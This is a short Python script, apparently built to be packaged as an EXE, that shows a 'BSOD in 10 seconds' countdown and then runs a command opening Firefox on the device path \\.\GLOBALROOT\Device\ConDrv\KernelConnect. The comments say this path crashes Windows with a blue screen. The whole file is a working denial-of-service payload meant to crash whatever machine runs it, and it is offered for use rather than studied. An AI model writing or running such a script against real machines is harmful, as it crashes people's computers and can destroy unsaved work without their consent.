# Temporary fix to suppress the DeprecationWarning for the `imp` module
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

import time, os, sys, imp

sys.argv.append("-W ignore::DeprecationWarning")

# Detect wether you're running an EXE or PY file
def isEXE():
  return (hasattr(sys, "frozen") or # new py2exe
          hasattr(sys, "importers") # old py2exe
          or imp.is_frozen("__main__")) # tools/freeze

if isEXE() == False:
  print("EXE: %s" % isEXE())
  # Wait for 10 seconds
  print("BSOD in 10 seconds", end="\r")
  time.sleep(.5)
  print("BSOD in 10 seconds.", end="\r")
  time.sleep(.5)
  print("BSOD in 10 seconds..", end="\r")
  time.sleep(.5)
  print("BSOD in 10 seconds...")
  for n in range(0, 11):
    print("Progress >> %s/10" % n, end="\r")
    time.sleep(1)
  print("Payload activated!")

# Windows BSODs when you enter `\\.\GLOBALROOT\Device\ConDrv\KernelConnect`
# into a browser. Sadly this doesn't work on the built-in Internet Explorer,
# I'll test Edge later.

# Open in Firefox
os.system("cmd /c start firefox -private \"\\\\.\\GLOBALROOT\\Device\\ConDrv\\KernelConnect\"")
